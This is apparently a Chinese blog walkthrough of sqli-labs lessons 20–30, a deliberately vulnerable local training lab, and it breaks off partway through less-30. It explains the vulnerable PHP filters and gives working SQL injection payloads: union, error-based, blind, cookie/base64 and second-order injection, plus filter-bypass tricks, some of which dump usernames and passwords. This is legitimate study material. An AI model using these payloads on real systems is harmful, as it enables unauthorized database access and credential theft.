<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 修改Cookie的值为</span><br><span class="line">Dumb&#39; #</span><br><span class="line"># 这里不能使用 --+。原因：+ 号在 Cookie 中不会被 URL 解码为空格可以采用下面这种方式。</span><br><span class="line">Dumb&#39;--%20</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 测试回显的字段</span><br><span class="line">Dum&#39; union select 1, 2, 3--%20</span><br><span class="line"># 查看数据库</span><br><span class="line">Dum&#39; union select 1, 2, database()--%20</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>联合注入 Payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Dum&#39; union select 1, 2, database()--%20</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>报错注入 Payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Dum&#39; and updatexml(1, concat(0x7e, database(), 0x7e), 1)--%20</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>布尔盲注 Payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Dumb&#39; and if(database()&#x3D;&#39;security&#39;, 1, 0)--%20</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>时间盲注 Payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Dumb&#39; and if(database()&#x3D;&#39;security&#39;, sleep(3), 0)--%20</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<hr>
<h1 id="3-高级注入-21-37"><a href="#3-高级注入-21-37" class="headerlink" title="3 高级注入(21-37)"></a>3 高级注入(21-37)</h1><h2 id="less-21"><a href="#less-21" class="headerlink" title="less-21"></a>less-21</h2><p>闭合方式：<code>username=(&#39;$cookee&#39;)</code></p>
<p>关键词：cookie、base64加密、单引号和括号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 进行简单的闭合</span><br><span class="line">Dumb&#39;) #</span><br><span class="line"># base64加密后：RHVtYicpICM&#x3D;</span><br><span class="line"></span><br><span class="line"># Union注入Payload</span><br><span class="line">Dum&#39;) union select 1, 2, 3#</span><br><span class="line"></span><br><span class="line"># 报错注入Payload</span><br><span class="line">Dum&#39;) and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- （最后有一个空格，也可以使用#）</span><br><span class="line"># base64加密后：RHVtJykgYW5kIHVwZGF0ZXhtbCgxLCBjb25jYXQoMHg3ZSwgZGF0YWJhc2UoKSwgMHg3ZSksIDEpLS0g</span><br><span class="line"># 没有空格加密后：RHVtJykgYW5kIHVwZGF0ZXhtbCgxLCBjb25jYXQoMHg3ZSwgZGF0YWJhc2UoKSwgMHg3ZSksIDEpLS0&#x3D;</span><br><span class="line"></span><br><span class="line"># 时间盲注Payload</span><br><span class="line">Dumb&#39;) and if(database()&#x3D;&#39;security&#39;, sleep(3), 0)#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h2><p>闭合方式： <code>username=&quot;$cookee&quot;</code></p>
<p>关键词：cookie、base64加密、双引号</p>
<p>同上一题，将单引号和括号改为双引号即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># Union注入Payload</span><br><span class="line">Dum&quot; union select 1, 2, 3#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p>
<p>关键词：基于错误、过滤注释</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 尝试进行闭合（注释被替换成为空）</span><br><span class="line">?id&#x3D;1&#39; and sleep(3) and &#39;1</span><br><span class="line"></span><br><span class="line"># 国光大师傅的Payload：</span><br><span class="line">?id&#x3D;-1&#39; union select 1,(SELECT(@x)FROM(SELECT(@x:&#x3D;0x00) ,(SELECT(@x)FROM(users)WHERE(@x)IN(@x:&#x3D;CONCAT(0x20,@x,username,password,0x3c62723e))))x),3 and &#39;1&#39;&#x3D;&#39;1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>题目源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//filter the comments out so as to comments should not work</span></span><br><span class="line">$reg = <span class="string">&quot;/#/&quot;</span>;</span><br><span class="line">$reg1 = <span class="string">&quot;/--/&quot;</span>;</span><br><span class="line">$replace = <span class="string">&quot;&quot;</span>;</span><br><span class="line">$id = preg_replace($reg, $replace, $id);</span><br><span class="line">$id = preg_replace($reg1, $replace, $id);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>正如源码所示，将 # 和 – 替换为空，所以可以采用闭合的方式进行注入。</p>
<hr>
<h2 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h2><p>关键词：经典二次注入、存储注入</p>
<p>二次注入通常在注册的位置，插入数据的时候不会产生错误信息，但是在执行其他语句的时候发生了错误。<br>（第一次是向数据库插入Payload，第二次是利用Payload）</p>
<p>Update语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$curr_pass&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>当用户名为 admin’# 时，sql 语句会变成</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">UPDATE users SET PASSWORD&#x3D;&#39;$pass&#39; where username&#x3D;&#39;admin&#39;# and password&#x3D;&#39;$curr_pass&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这样就会修改 admin 的密码，而不是我自己注册的账号。</p>
<p>通过这个页面 <a target="_blank" rel="noopener" href="http://localhost:4000/Less-24">http://localhost:4000/Less-24</a> 进入注册页面失败，发现是文件路径未找到。在后面填加 index 之后就正常执行了，即访问：<a target="_blank" rel="noopener" href="http://localhost:4000/Less-24/index.php%E3%80%82">http://localhost:4000/Less-24/index.php。</a></p>
<p>注册新用户<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/5B29A116-C50E-4DB1-A821-6345CC7FB629.png"><br>在修改页面进行密码修改，即可修改 admin 的密码。<br><img src="https://blog-1256032382.cos.ap-nanjing.myqcloud.com/img/8EBA386F-FB14-45C1-AE56-1D196A017E6B.png"></p>
<hr>
<h2 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p>
<p>关键词：GET 类型、过滤 and+or。</p>
<p>关键代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params">$id</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);            <span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">    $id= preg_replace(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);        <span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$id= blacklist($id);</span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里的 or 和 and 只被替换了一次，所以可以采用双写绕过。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 联合注入 Payload</span><br><span class="line">?id&#x3D;-1&#39; union select 1,2,(SELECT+GROUP_CONCAT(username,passwoorrd+SEPARATOORR+0x3c62723e)+FROM+users)--+</span><br><span class="line"># 其中 password 改为 passwoord，separator 改为 separatoorr（设置分隔符），0x3c62723e 是十六进制的&lt;br&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>and 可以使用 &amp;&amp; 替换，or 使用 || 替换</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 报错注入Payload</span><br><span class="line">?id&#x3D;1&#39;||extractvalue(1,concat(0x7e,database()))--+</span><br><span class="line">?id&#x3D;1&#39;||extractvalue(1,concat(0x7e,(SELECT+GROUP_CONCAT(username,passwoorrd+SEPARATOORR+0x3c62723e)+FROM+users)))--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p>
<p>关键词：报错注入、过滤空格和注释符、过滤 and 和 or、单引号</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 过滤了 or 和 and 大小写</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;or&#x2F;i&#39;,&quot;&quot;, $id);            &#x2F;&#x2F;strip out OR (non case sensitive)</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;and&#x2F;i&#39;,&quot;&quot;, $id);        &#x2F;&#x2F;Strip out AND (non case sensitive)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 过滤了 &#x2F;*</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;[\&#x2F;\*]&#x2F;&#39;,&quot;&quot;, $id);        &#x2F;&#x2F;strip out &#x2F;*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 过滤了 -- 和 # 注释</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;[--]&#x2F;&#39;,&quot;&quot;, $id);        &#x2F;&#x2F;Strip out --</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;[#]&#x2F;&#39;,&quot;&quot;, $id);            &#x2F;&#x2F;Strip out #</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 过滤了空格</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;[\s]&#x2F;&#39;,&quot;&quot;, $id);        &#x2F;&#x2F;Strip out spaces</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 过滤了斜线</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;[\&#x2F;\\\\]&#x2F;&#39;,&quot;&quot;, $id);        &#x2F;&#x2F;Strip out slashes</span><br><span class="line">return $id;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>过滤 or 和 and：可以用 &amp;&amp; 和 || 替换或者采用双写的方式绕过</li>
<li>过滤空格：可以用下表的字符进行替换<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">%09 TAB 键(水平) </span><br><span class="line">%0a 新建一行 </span><br><span class="line">%0c 新的一页 </span><br><span class="line">%0d return 功能 </span><br><span class="line">%0b TAB 键(垂直) </span><br><span class="line">%a0 空格 </span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li>过滤注释：可以用两侧闭合方式绕过。例如：less-23<br>可以构建 Payload 得：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 测试是否可以执行</span><br><span class="line">?id&#x3D;1&#39;%26%26sleep(3)%26%26&#39;1</span><br><span class="line"># 其中%26是&amp;，使用两侧闭合方式绕过注释</span><br><span class="line"></span><br><span class="line"># 报错注入Payload</span><br><span class="line">?id&#x3D;1&#39;%26%26extractvalue(1,concat(0x7e,database()))%26%26&#39;1</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="less-26a"><a href="#less-26a" class="headerlink" title="less-26a"></a>less-26a</h2><p>闭合方式：<code>id=(&#39;$id&#39;)</code></p>
<p>关键词：盲注、布尔注入、延时注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;1</span><br><span class="line">?id&#x3D;1&#39;%26%26&#39;1</span><br><span class="line"># 返回结果相同，成功闭合SQL语句</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h2><p>闭合方式：<code>id=(&#39;$id&#39;)</code></p>
<p>关键词：基于错误、过滤 Union 和 Select</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 测试能否闭合</span><br><span class="line">?id&#x3D;1&#39;%26%26&#39;1</span><br><span class="line">?id&#x3D;1&#39;%26%26sleep(3)%26%26&#39;1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>过滤 Union 和 select：采用双写绕过（原理同 or 和 and）、采用大小写混合绕过（MySQL对大小写并不敏感）<br>关键代码：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 过滤了 /*</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);</span><br><span class="line"><span class="comment"># 过滤了 -</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);</span><br><span class="line"><span class="comment"># 过滤了 #</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);</span><br><span class="line"><span class="comment"># 过滤了空格</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);</span><br><span class="line"><span class="comment"># 过滤了 select /m 严格模式 不可以使用双写绕过</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);</span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);</span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);</span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 过滤了 union UNION</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);</span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);</span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);</span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
进行报错注入（类似 less-26）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 报错注入 Payload</span><br><span class="line">?id&#x3D;1&#39;%26%26extractvalue(1, concat(0x7e, database()))%26%26&#39;1</span><br><span class="line">?id&#x3D;1&#39;%26%26extractvalue(1, concat(0x7e, seleselectct database()))%26%26&#39;1</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h2 id="less-27a"><a href="#less-27a" class="headerlink" title="less-27a"></a>less-27a</h2><p>闭合方式：<code>id=&quot;$id&quot;</code></p>
<p>同 less-27，闭合方式不同。没有输出报错信息，所以不能报错注入。关键代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$id = <span class="string">&#x27;&quot;&#x27;</span> .$id. <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>尝试注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 测试闭合情况</span><br><span class="line">?id&#x3D;1%26%261</span><br><span class="line"></span><br><span class="line">?id&#x3D;1&quot;%26%26sleep(3)%26%26&quot;1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h2><p>闭合方式：<code>id=(&#39;$id&#39;)</code> </p>
<p>关键词：基于错误、过滤 Union 和 Select、单引号+括号<br>关键代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 过滤 /*</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 过滤 - # 注释</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);</span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 过滤 空格 +</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 过滤 union select /i 大小写都过滤</span></span><br><span class="line">$id= preg_replace(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, $id);</span><br><span class="line"><span class="keyword">return</span> $id;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>过滤 union select /i 大小写都过滤：只能采用双写的方式进行注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 测试SQL语句是否执行</span><br><span class="line"> ?id&#x3D;1&#39;)%26%26sleep(3)%26%26(&#39;1</span><br><span class="line"></span><br><span class="line"># 延时注入Payload</span><br><span class="line">?id&#x3D;1&#39;)%26%26if(database()&#x3D;&#39;security&#39;, sleep(3), 1)%26%26(&#39;1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h2 id="less-28a"><a href="#less-28a" class="headerlink" title="less-28a"></a>less-28a</h2><p>闭合方式：<code>id=(&#39;$id&#39;)</code></p>
<p>关键代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">function blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;$id&#x3D; preg_replace(&#39;&#x2F;[\&#x2F;\*]&#x2F;&#39;,&quot;&quot;, $id); &#x2F;&#x2F;strip out &#x2F;*</span><br><span class="line">&#x2F;&#x2F;$id&#x3D; preg_replace(&#39;&#x2F;[--]&#x2F;&#39;,&quot;&quot;, $id); &#x2F;&#x2F;Strip out --.</span><br><span class="line">&#x2F;&#x2F;$id&#x3D; preg_replace(&#39;&#x2F;[#]&#x2F;&#39;,&quot;&quot;, $id); &#x2F;&#x2F;Strip out #.</span><br><span class="line">&#x2F;&#x2F;$id&#x3D; preg_replace(&#39;&#x2F;[ +]&#x2F;&#39;,&quot;&quot;, $id); &#x2F;&#x2F;Strip out spaces.</span><br><span class="line">&#x2F;&#x2F;$id&#x3D; preg_replace(&#39;&#x2F;select&#x2F;m&#39;,&quot;&quot;, $id); &#x2F;&#x2F;Strip out spaces.</span><br><span class="line">&#x2F;&#x2F;$id&#x3D; preg_replace(&#39;&#x2F;[ +]&#x2F;&#39;,&quot;&quot;, $id); &#x2F;&#x2F;Strip out spaces.</span><br><span class="line">$id&#x3D; preg_replace(&#39;&#x2F;union\s+select&#x2F;i&#39;,&quot;&quot;, $id); &#x2F;&#x2F;Strip out spaces.</span><br><span class="line">return $id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;(&#39;$id&#39;) LIMIT 0,1&quot;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>测试 Payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 闭合 SQL</span><br><span class="line">?id&#x3D;1&#39;)--+</span><br><span class="line"></span><br><span class="line"># 联合注入 Payload（国光大佬的 payload 测试失败）</span><br><span class="line">?id&#x3D;0&#39;) union&#x2F;**&#x2F;select 1, 2, 3--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="less-30"><a href="#less-30" class="headerlink" title="less-30"></a>less-30</h2><p>闭合方式：<code>id=&#39;$id&#39;</code></p>
<p>关键词：GET、基于错误、WAF</p>
<p>index.php 关键代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> 有结果：</span><br><span class="line">    输出</span><br><span class="line"><span class="keyword">else</span>：</span><br><span class="line">    输出报错信息</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>第一题太简单了吧，联合注入 Payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id&#x3D;0&#39; union select 1, 2, 3--+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>login.php 关键代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 获取查询的字符串</span></span><br><span class="line">$qs = $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 模拟Tomcat进行中间过滤</span></span><br><span class="line">$id1=java_implimentation($qs);</span><br><span class="line">$id=$_GET[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// 白名单</span></span><br><span class="line">whitelist($id1);</span><br><span class="line"></span><br><span class="line"><span class="comment">// SQL语句</span></span><br><span class="line">$sql=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// WAF</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">whitelist</span>(<span class="params">$input</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 检测数字 